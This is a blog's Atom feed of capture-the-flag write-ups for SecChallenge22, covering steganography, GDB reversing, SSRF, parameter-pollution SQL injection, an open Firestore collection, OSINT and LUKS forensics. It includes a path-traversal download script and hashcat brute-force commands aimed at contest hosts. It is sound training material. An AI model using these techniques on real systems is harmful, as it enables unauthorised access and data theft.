@@ -1,0 +1,711 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="https://m4rcix.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://m4rcix.github.io/" rel="alternate" type="text/html" /><updated>2022-05-05T13:18:03+00:00</updated><id>https://m4rcix.github.io/feed.xml</id><title type="html">m4rcix</title><subtitle>*in my best possible Obi-Wan Kenobi impression* Hello there! My name is Marci(x) and my intrests are, to name a few: cybersecurity, videogames, speedrunning. In this blog I will mostly write about my studies, CTFs I attended, challenges I solved, and probably anything else I feel like writing about. If you want, feel free to check out my socials, if you wanna contact me, feel free to do so on Discord, Twitter, etc. Happy reading! :)
+</subtitle><author><name>m4rcix</name></author><entry><title type="html">Piecemaker</title><link href="https://m4rcix.github.io/sc22/misc/piecemaker" rel="alternate" type="text/html" title="Piecemaker" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/misc/piecemaker</id><content type="html" xml:base="https://m4rcix.github.io/sc22/misc/piecemaker"><![CDATA[<h2 id="description">Description</h2>
+
+<p>There is a secret hidden deep in the DC universe. It’s a conspiracy… Or is it?</p>
+
+<ul>
+  <li>Author: tcs</li>
+  <li>Attachments: <a href="/media/sc22/misc/piecemaker/piecemaker.tar.gz">piecemaker.tar.gz</a></li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<h3 id="0x1-initial-puzzle">0x1 initial puzzle</h3>
+
+<p>Extracting the files from the given archive, we get tons of puzzle pieces. The task seems simple, put it together. With a bit of python magic, we can remove most of the green background, and put the puzzle pieces together using <code class="language-plaintext highlighter-rouge">GIMP</code> for example.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+<span class="kn">import</span> <span class="nn">glob</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">images</span> <span class="o">=</span> <span class="n">glob</span><span class="p">.</span><span class="n">glob</span><span class="p">(</span><span class="s">"../*.jpg"</span><span class="p">)</span>
+
+<span class="n">pr</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Status"</span><span class="p">)</span>
+
+<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">for</span> <span class="n">image</span> <span class="ow">in</span> <span class="n">images</span><span class="p">:</span>
+    <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
+    <span class="n">img</span> <span class="o">=</span> <span class="n">img</span><span class="p">.</span><span class="n">convert</span><span class="p">(</span><span class="s">"RGBA"</span><span class="p">)</span>
+    <span class="n">datas</span> <span class="o">=</span> <span class="n">img</span><span class="p">.</span><span class="n">getdata</span><span class="p">()</span>
+
+
+    <span class="n">newData</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">datas</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">240</span> <span class="ow">and</span> <span class="n">item</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">:</span>
+            <span class="n">newData</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">newData</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">item</span><span class="p">)</span>
+
+    <span class="n">img</span><span class="p">.</span><span class="n">putdata</span><span class="p">(</span><span class="n">newData</span><span class="p">)</span>
+    <span class="n">img</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s">.png"</span><span class="p">,</span> <span class="s">"PNG"</span><span class="p">)</span>
+    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="n">pr</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">count</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">images</span><span class="p">)</span> <span class="o">*</span> <span class="mi">100</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+<span class="n">pr</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Done"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><img src="/media/sc22/misc/piecemaker/puzzle.png" alt="image" /></p>
+
+<p>This had me puzzled (haHa) for a while, but after googling some languages commonly used in CTFs, I found out about <code class="language-plaintext highlighter-rouge">Klingon</code>. Using some <code class="language-plaintext highlighter-rouge">ABCs</code> found online I could decode the following text on the image:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>this is christopher smith known as p
+eacemaker i love formula one aka f1
+as well as f2 and f3 but you know wh
+at would be even better f5 i also lo
+ve java but scripting should be bann
+ed the whole password is in gold
+
+i cherish peace with all my heart
+i dont care how many men women and
+children i need to kill to get it
+</code></pre></div></div>
+
+<p>This next part required a hint from the author, since everyone was stuck on this part for a moment. The hint came:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>We've just received an urgent transmission from Peacemaker telling us his favorite dinosaur is stegosaurus.
+</code></pre></div></div>
+<p>Alright, a stego challenge, nothing I haven’t knew before. But this finally led me to google for <code class="language-plaintext highlighter-rouge">stego f5 java</code> insead of <code class="language-plaintext highlighter-rouge">f5 java</code>. And trust me, it made all the diference (Why would you name a firewall company after a stego tool or vice versa???). I wrote a <code class="language-plaintext highlighter-rouge">bash</code> script to extract whatever is hidden inside the images (just so you see other things on this blog besides python scripts):</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nb">declare</span> <span class="nt">-i</span> <span class="nv">c</span><span class="o">=</span>0
+
+<span class="nb">mkdir</span> <span class="nt">-p</span> out/
+
+<span class="k">for </span>f <span class="k">in </span>piecemaker/<span class="k">*</span>.jpg
+<span class="k">do
+	</span>java <span class="nt">-jar</span> f5.jar x <span class="nt">-e</span> out/<span class="nv">$c</span>.gz <span class="nv">$f</span> <span class="nt">-p</span> <span class="s2">"i cherish peace with all my heart i dont care how many men women and children i need to kill to get it"</span><span class="p">;</span>
+	c+<span class="o">=</span>1	
+<span class="k">done
+
+</span><span class="nb">cd </span>out/
+<span class="nb">rm </span>91.gz 92.gz 93.gz 94.gz 95.gz 96.gz 97.gz 98.gz 99.gz 100.gz 101.gz 102.gz
+<span class="nb">rm </span>103.gz 104.gz 105.gz 106.gz 107.gz 108.gz 109.gz 110.gz 111.gz
+
+<span class="k">for </span>file <span class="k">in</span> <span class="k">*</span>.gz
+<span class="k">do
+	</span><span class="nb">tar </span>zxvf <span class="nv">$file</span>
+<span class="k">done</span>
+</code></pre></div></div>
+
+<h3 id="0x2-joyride-to-the-flag">0x2 joyride to the flag</h3>
+
+<p>At this point, I know, I had the flag… there was only a small problem, again, it was in pieces. Luckily the creator didn’t make any more matryoshkas, or else I would have been sitting here for quite some time.
+Piece by piece, I put together the puzzle, which contained the flag as an image:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="misc" /><category term="secchallenge22" /><summary type="html"><![CDATA[Thank god there were only two]]></summary></entry><entry><title type="html">Layers</title><link href="https://m4rcix.github.io/sc22/reverse/layers" rel="alternate" type="text/html" title="Layers" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/reverse/layers</id><content type="html" xml:base="https://m4rcix.github.io/sc22/reverse/layers"><![CDATA[<h2 id="description">Description</h2>
+
+<p>What is an ogre’s favourite network arrangement? … onion routing</p>
+
+<ul>
+  <li>Author: Sun G</li>
+  <li>Attachment: <a href="/media/sc22/reverse/layers/layers">layers</a></li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<h3 id="0x1-basic-information">0x1 basic information</h3>
+
+<p>Starting the binary, the goal seems simple: enter the correct answers, and something will happen, hopefully we get the flag. Digging deeper using <code class="language-plaintext highlighter-rouge">GDB</code>, we see, that the challenge uses <code class="language-plaintext highlighter-rouge">strcmp</code> in order to check, if the answer we provided is correct. I have looked at the source code using <code class="language-plaintext highlighter-rouge">Ghidra</code> as well, but seemed like the strings are somewhat obfuscated, so I tried going another way, which turned out to be a great idea.</p>
+
+<h3 id="0x2-solution">0x2 solution</h3>
+
+<p>Since we are running this program on our own machine, noone is stopping us from modifying the containts of the registers. This lets us save a ton of work. Let the program deobfuscate the correct answer for itself, then right before the call to <code class="language-plaintext highlighter-rouge">strcmp</code> we can just steal it.</p>
+
+<p>The challenge name suggests, that we are going to have to do this a couple of times, so I went ahead and automated it using <code class="language-plaintext highlighter-rouge">gdb scripts</code>. To not present you a one-click solution, the <code class="language-plaintext highlighter-rouge">gdb script</code> is removed from this writeup, however with the above described method, one should be able to replicate my solution.</p>
+
+<p>The acquired flag is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="reverse" /><category term="secchallenge22" /><summary type="html"><![CDATA[Glitch in the matrix.. a solvable Sun G challenge?]]></summary></entry><entry><title type="html">Note Keeper</title><link href="https://m4rcix.github.io/sc22/web/notekeeper" rel="alternate" type="text/html" title="Note Keeper" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/web/notekeeper</id><content type="html" xml:base="https://m4rcix.github.io/sc22/web/notekeeper"><![CDATA[<h2 id="description">Description</h2>
+
+<p>There is a secret on <code class="language-plaintext highlighter-rouge">flag.secchallenge.crysys.hu</code>, but it is not accessible. Luckily <code class="language-plaintext highlighter-rouge">notekeeper.secchallenge.crysys.hu</code> is served from the same host. You might find a vulnerability and access the secret portal. Good Luck!</p>
+
+<p><a href="https://notekeeper.secchallenge.crysys.hu/">https://notekeeper.secchallenge.crysys.hu/</a></p>
+
+<ul>
+  <li>Author: Pepe</li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<p>Fiddling around the website, we can register a user, login with the created user, upload a profile picture, and leave notes. Since the title of the challenge was Note Keeper, I spent way to much time with trying to exploit the <code class="language-plaintext highlighter-rouge">/notes</code> endpoint, without success.</p>
+
+<p>Luckily I stumbled back to the <code class="language-plaintext highlighter-rouge">/profile</code> endpoint, and started playing with the profile upload. I realized, that I could upload any file, and it would be hosted on the site. I’ve also read about a PHP vuln, that let’s you upload images, and inside the images you can hide PHP code, which will be executed.
+This wasn’t the case however. Later Pepe told me (after solving the challenge), the challenge wasn’t created using PHP.</p>
+
+<p>It felt like I was on the correct path, so I diged deeper. Scanning through the description of the challenge, a lightbulb moment came. I cannot access the <code class="language-plaintext highlighter-rouge">flag.secchallenge.crysys.hu</code> but maybe the script, that downloads the file can. So I gave it <code class="language-plaintext highlighter-rouge">https://flag.secchallenge.crysys.hu</code> and it died, Response 500.</p>
+
+<p>This also took some time, but finally inputting <code class="language-plaintext highlighter-rouge">http://flag.secchallenge.crysys.hu</code> into the URL field didn’t make my profile unusable, and my profile picture got updated. Following the link to the “picture”, I am prompted to download the <code class="language-plaintext highlighter-rouge">avatar</code>. Looking at it, its clearly an HTML source, so we finally hit jackpot. Rendering the HTML page, we can see a hint, that we are on the right path, just not quite yet there.</p>
+
+<p><img src="/media/sc22/web/note/mario_meme.png" alt="image" /></p>
+
+<p>Again, based on an educated guess, the flag will suuuuuurely be on <code class="language-plaintext highlighter-rouge">http://flag.secchallenge.crysys.hu/flag</code> right? Correct. Querying the aforementioned endpoint updates our profile picture yet again. Downloading that avatar yields us the flag:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="web" /><category term="secchallenge22" /><summary type="html"><![CDATA[It\'s a meee, Marcix]]></summary></entry><entry><title type="html">Waffles</title><link href="https://m4rcix.github.io/sc22/web/waffles" rel="alternate" type="text/html" title="Waffles" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/web/waffles</id><content type="html" xml:base="https://m4rcix.github.io/sc22/web/waffles"><![CDATA[<h2 id="description">Description</h2>
+
+<p>You can take over your orders at the Waffle Kiosk. All you need is your order identifier. Can you get every waffles in the database?</p>
+
+<p><a href="https://waffles.secchallenge.crysys.hu/">https://waffles.secchallenge.crysys.hu/</a></p>
+
+<ul>
+  <li>Author: Pepe</li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<h3 id="0x1-basic-information">0x1 basic information</h3>
+
+<p>Based on the title of the challenge, we are facing some kind of WAF, however the task seems simple: Bypass the WAF, inject SQL commands, WIN.
+On the main page, you can enter an ID, and if you are lucky, you get your order back. Testing some general numbers, we find a valid order easily:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://waffles.secchallenge.crysys.hu/?id=1337
+</code></pre></div></div>
+
+<h3 id="0x2-exploit">0x2 exploit</h3>
+
+<p>I started fidgeting around with the input, but the WAF seemed to catch everything, so the idea of running some kind of tamper script using <code class="language-plaintext highlighter-rouge">sqlmap</code> quickly went out the window. After being stuck with this idea for a while, I started googling and came to <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution">this</a> article.</p>
+
+<p>Testing this idea with the following two URLs lead me to the conclusion, this is probably the intended way to solve this challenge:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://waffles.secchallenge.crysys.hu/?id=1&amp;id=1337
+https://waffles.secchallenge.crysys.hu/?id=1337&amp;id=1
+</code></pre></div></div>
+<p>Running these queries, we can clearly see, that the second (polluted) parameter is the one that actually is used in our final query. So maybe the WAF is checking the first one, and we can do anything we want with the second? Exactly. From here, we can just automate things with <code class="language-plaintext highlighter-rouge">sqlmap</code> and the flag is quickly dumped from the database. (Thank you Pepe for not using a time based SQLi this time).</p>
+
+<p>The acquired flag is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="web" /><category term="secchallenge22" /><summary type="html"><![CDATA[Who doesn\'t like \'em?]]></summary></entry><entry><title type="html">Snek</title><link href="https://m4rcix.github.io/sc22/web/snek" rel="alternate" type="text/html" title="Snek" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/web/snek</id><content type="html" xml:base="https://m4rcix.github.io/sc22/web/snek"><![CDATA[<h2 id="description">Description</h2>
+
+<p>Let’s see who is the best snake player in the CTF!</p>
+
+<p><a href="https://snek.secchallenge.crysys.hu/">https://snek.secchallenge.crysys.hu/</a></p>
+
+<ul>
+  <li>Author: Pepe</li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<h3 id="0x1-reversing">0x1 reversing</h3>
+
+<p>The source code wasn’t given, although inspecting the site, everything is done using client-side javascript (YAY). So I started to reverse the source code, and quickly realized, that the game accesses scoreboard data via <code class="language-plaintext highlighter-rouge">firebase</code>. Deobfuscating the code, we can see, that the database is stored in a collection named <code class="language-plaintext highlighter-rouge">scoreboard</code>.</p>
+
+<h3 id="0x2-getting-the-flag">0x2 getting the flag</h3>
+
+<p>Reading through the firebase <a href="https://firebase.google.com/docs/firestore/query-data/get-data">documentations</a>, we acquire the necessary skills in order to get the flag. The only thing left to figure out, where the flag is being stored. The first educated guess works, and we can acquire the flag by running:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">flag</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">collection</span><span class="p">(</span><span class="dl">"</span><span class="s2">scoreboard</span><span class="dl">"</span><span class="p">).</span><span class="nx">doc</span><span class="p">(</span><span class="dl">"</span><span class="s2">flag</span><span class="dl">"</span><span class="p">).</span><span class="kd">get</span><span class="p">()</span>
+
+<span class="nx">flag</span><span class="p">.</span><span class="nx">data</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>The acquired flag is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="web" /><category term="secchallenge22" /><summary type="html"><![CDATA[Speedrunning to get the highscore]]></summary></entry><entry><title type="html">Instant Development Company</title><link href="https://m4rcix.github.io/sc22/web/instant" rel="alternate" type="text/html" title="Instant Development Company" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/web/instant</id><content type="html" xml:base="https://m4rcix.github.io/sc22/web/instant"><![CDATA[<h2 id="description">Description</h2>
+
+<p>Your uncle got scammed but he’s too embarrassed to tell you how much he had lost. Can you find out?</p>
+
+<p><a href="https://instant-development-company.secchallenge.crysys.hu">https://instant-development-company.secchallenge.crysys.hu</a></p>
+
+<ul>
+  <li>Author: Andrix</li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<p>Opening up the site we aren’t presented with too many options, so we head to the <code class="language-plaintext highlighter-rouge">/review</code> endpoint through the link on the main page. Its vulnerable to XSS but other than that, I could not find anything interesting.
+I decided to go back to the roots, and started running <code class="language-plaintext highlighter-rouge">dirbuster</code> on the site, and it quickly found a hidden endpoint: <code class="language-plaintext highlighter-rouge">/debug</code>.</p>
+
+<p>On there we have bunch of options, but downloading source seems like a good place to start.
+After acquiring the source files we are presented with:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>announce.html
+base.html
+debug.html
+index.html
+reviews.html
+</code></pre></div></div>
+
+<p>Reading through the files, we can see some comments inside the <code class="language-plaintext highlighter-rouge">debug.html</code> file, which indicate, that a <code class="language-plaintext highlighter-rouge">backup.zip</code> file with an easy to break password is accessible from the webroot. We can download the mentioned file using a small python script:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"https://instant-development-company.secchallenge.crysys.hu/download/templates"</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'template'</span><span class="p">:</span> <span class="s">'../backup.zip'</span><span class="p">},</span> <span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'backup.zip'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+	<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>From here we are required to crack the password. To do this, we first extract the password hash, then we can use hashcat to crack it.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip2john backup.zip <span class="o">&gt;</span> backup.hash
+<span class="c"># remove unnecessary content from backup.hash</span>
+<span class="c"># or else hashcat will throw errors</span>
+
+<span class="c"># -a brute -m hashtype = PKZIP (Compressed Multi-File) file format</span>
+hashcat <span class="nt">-a</span> 3 <span class="nt">-m</span> 17220 backup.hash ?d?d?d?d?d?d?d?d?d?d
+</code></pre></div></div>
+
+<p>Once hashcat crunched all the possibilities, we can unzip the previously extracted zipfile. It contains two files:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>README.txt
+contracts.txt
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">README</code> contains some sort of clue/meme, but the <code class="language-plaintext highlighter-rouge">contracts.txt</code> is the file we are looking for. It contains a bunch of, already expired S3 links.</p>
+
+<p>At this point I got lucky, and solved the challenge by accident using python (I realized if I use curl, the links remain accessible, and I can read the contents, probably due to some AWS missconfiguration):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"contracts.txt"</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+	<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>
+		<span class="n">r</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s">'curl </span><span class="si">{</span><span class="n">line</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>After the solve, I contacted Andrix, who gave the explaination:
+If you forgo the parameters given to the http request (the stuff after the <code class="language-plaintext highlighter-rouge">?</code> in the URL) you can abuse the AWS S3 missconfiguration.</p>
+
+<p>The acquired flag is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="web" /><category term="secchallenge22" /><summary type="html"><![CDATA[Red herring city]]></summary></entry><entry><title type="html">Dangerous Volcano</title><link href="https://m4rcix.github.io/sc22/misc/dangerous_volcano" rel="alternate" type="text/html" title="Dangerous Volcano" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/misc/volcano</id><content type="html" xml:base="https://m4rcix.github.io/sc22/misc/dangerous_volcano"><![CDATA[<h2 id="description">Description</h2>
+
+<p>Hi there Bob,</p>
+
+<p>There is this rival IT Security company called <code class="language-plaintext highlighter-rouge">securityZilla</code>, that is undermining our contracts with some dirty tactics and we don’t want to go out of business because of them.</p>
+
+<p>I’m taking you off the <code class="language-plaintext highlighter-rouge">Fancy Mamba</code> case, and from now on your task is to find out something compromising about this firm. Their public website is <a href="https://securityzilla.secchallenge.crysys.hu">https://securityzilla.secchallenge.crysys.hu</a>.</p>
+
+<p>The codename of the project is <code class="language-plaintext highlighter-rouge">Dangerous Volcano</code>.</p>
+
+<p>Report to me when you find something,</p>
+
+<p>Dan</p>
+
+<p><em>Note: This is not a web challenge!
+Also, any connection with last year’s <code class="language-plaintext highlighter-rouge">Lost &amp; Found</code> challenge or with any twitter, github or flickr user profiles, is purely coincidental.</em></p>
+
+<ul>
+  <li>Author: veloxer</li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<p>Just from the description, it is clear, we are looking at an OSINT challenge.
+Scanning through the site, we can see an email address connected to Janos Nagy: <code class="language-plaintext highlighter-rouge">themrbigjack@gmail.com</code>.</p>
+
+<p>Without thinking I added this to my address book, a habbit I picked up after miserably failing last years OSINT challenge. Since this did nothing I started thinking and realized, I have seen something like this before. There is/was a challenge on HTB, which used the same technique, Google ID.</p>
+
+<p>Scraping the ID from the hangouts website, we can use it to look for entries of the user on the google map for example, and luckily for us, we found this:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">oid=</span><span class="s">"101442286581498986047"</span> <span class="na">email=</span><span class="s">"themrbigjack@gmail.com"</span> <span class="na">data-element-width=</span><span class="s">"399"</span> <span class="na">data-show-on-right=</span><span class="s">"true"</span> <span class="na">style=</span><span class="s">"position: absolute; left: 81px; top: 679.5px; width: 399px;"</span> <span class="na">data-hovercard-id=</span><span class="s">"themrbigjack@gmail.com"</span> <span class="na">data-hovercard-align=</span><span class="s">"h"</span> <span class="na">data-hovercard-owner-id=</span><span class="s">"6"</span><span class="nt">&gt;&lt;/div&gt;</span>
+</code></pre></div></div>
+
+<p>Using the <code class="language-plaintext highlighter-rouge">oid</code> from the previous html element, we can search the google map, and find <a href="https://www.google.com/maps/contrib/101442286581498986047">this</a>.</p>
+
+<p><img src="/media/sc22/misc/volcano/laptop.jpg" alt="image" /></p>
+
+<p>Looking at the image, we can see, its using a software called AnkiWeb.
+Its a kind of learning-card app, where you can share your Deck online with others. And by the looks of it, Mr. Big Jack just shared his top secret learning deck with us. Downloading the app, and getting the shared deck, which is visible on the image, we can flip through the deck, and the flag is ours:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="misc" /><category term="secchallenge22" /><summary type="html"><![CDATA[All those times spent on HTB finally came in clutch]]></summary></entry><entry><title type="html">falleen system</title><link href="https://m4rcix.github.io/sc22/reverse/falleen_system" rel="alternate" type="text/html" title="falleen system" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/reverse/falleen</id><content type="html" xml:base="https://m4rcix.github.io/sc22/reverse/falleen_system"><![CDATA[<h2 id="description">Description</h2>
+
+<p>We’ve managed to save magnetic tape from the bombarded remains of our capital. Our last hope in the fight against the dark side. But it is encrypted and even our sharpest engineers were unable to crack the code.</p>
+
+<p>Could you acquire the flag and save our humble species with it?</p>
+
+<ul>
+  <li>Author: tcs</li>
+  <li>Attachment: <a href="/media/sc22/reverse/falleen/magnetic-tape.dd">magnetic-tape.dd</a></li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<p>First things first, what file are we looking at. Running <code class="language-plaintext highlighter-rouge">file</code> on it, gives us the following answer:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>magnetic-tape.dd: DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 40959 sectors, extended partition table (last)
+</code></pre></div></div>
+
+<p>Ok, so we are looking at some sort of disk image. Running <code class="language-plaintext highlighter-rouge">binwalk</code> on it we can see, that there is a LUKS image inside, which we can extract using <code class="language-plaintext highlighter-rouge">dd</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dd </span><span class="k">if</span><span class="o">=</span>magnetic-tape.dd <span class="nv">of</span><span class="o">=</span>luks.part <span class="nv">skip</span><span class="o">=</span>2048 <span class="nv">count</span><span class="o">=</span>38878
+</code></pre></div></div>
+<p>LUKS is a way of encrypting disks on Linux, so we are going to need a key if we want to progress further. Luckily for us, we hit the jackpot on the first try. Running <code class="language-plaintext highlighter-rouge">strings</code> on the original file gives us tons of gibberish (as usual) and this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The key is:down with the separatists
+</code></pre></div></div>
+
+<p>Using <code class="language-plaintext highlighter-rouge">cryptsetup</code>, we can open the partition:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cryptsetup open <span class="nt">--type</span> luks luks.part luks.opened
+</code></pre></div></div>
+
+<p>Mounting the opened partition, aaaaaaaaaand, nothing. I was puzzled for a minute. But luckily we hit the jackpot twice in a row. Where could they hide the flag if not in a file? Of cource it will be in the opened partition.
+Running <code class="language-plaintext highlighter-rouge">strings</code> on it yields us the flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="reverse" /><category term="secchallenge22" /><summary type="html"><![CDATA[Pretty easy despite the low solve rate]]></summary></entry><entry><title type="html">che%s%s</title><link href="https://m4rcix.github.io/sc22/pwn/chess" rel="alternate" type="text/html" title="che%s%s" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/pwn/chess</id><content type="html" xml:base="https://m4rcix.github.io/sc22/pwn/chess"><![CDATA[<h2 id="description">Description</h2>
+
+<p>Ohh no! Someone just broke into our system!</p>
+
+<p>Ok, now they are stealing the source code of our unbeatable che%s%s engine. Aaaand we are locked out of our che%s%s service…</p>
+
+<p>We managed to capture their modified source code while the bad folks uploaded a new version of our software.</p>
+
+<p>Could you help us get inside again?</p>
+
+<p><code class="language-plaintext highlighter-rouge">nc chess.secchallenge.crysys.hu 5017</code></p>
+
+<ul>
+  <li>Author: tcs</li>
+  <li>Attachments: <a href="/media/sc22/pwn/chess/chess">chess</a>, <a href="/media/sc22/pwn/chess/chess-src.tar.gz">chess-src.tar.gz</a></li>
+</ul>
+
